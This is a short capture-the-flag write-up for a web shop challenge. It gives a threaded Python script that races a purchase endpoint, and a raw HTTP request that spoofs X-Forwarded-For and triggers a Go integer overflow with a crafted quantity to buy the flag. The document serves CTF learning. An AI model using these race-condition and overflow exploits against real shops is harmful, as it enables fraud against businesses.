##  easy tornado

##  Tools

* python
* burpsuite

##  Steps

* Step 1    

利用条件竞争购买20个大辣条
```python
import time
import requests
import threading

headers = {'Content-Type': 'application/x-www-form-urlencoded',
'Referer': 'http://49.4.79.236:31792/home',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With': 'XMLHttpRequest'}
cookie = {'go_iris_cookie':'e2045b76-f532-4303-ac71-e599de5d7e6a'}
for i in range(0xfffff):
    time.sleep(0.1)

    def AtoB():
        r = requests.post( 'http://49.4.79.236:31792/buylt', 
                           headers=headers, 
                           data={'number': 10},
                           cookies=cookie)
        print r.status_code
        print r.text
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
    threading.Thread(target=AtoB).start()
```

* step 2  
利用golang的整数溢出漏洞购买 18446744073709551615/5 + 1 个超级大辣条
```
POST /buyltw HTTP/1.1
Host: 117.78.26.155:31358
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://117.78.26.155:31358/home
Content-Length: 26
Cookie: go_iris_cookie=47c3b1ec-45d1-4b19-9bec-025a67e203b6
X-Forwarded-For: 127.0.0.1
Connection: close

number=3689348814741910324
```

* step 3  
购买flag




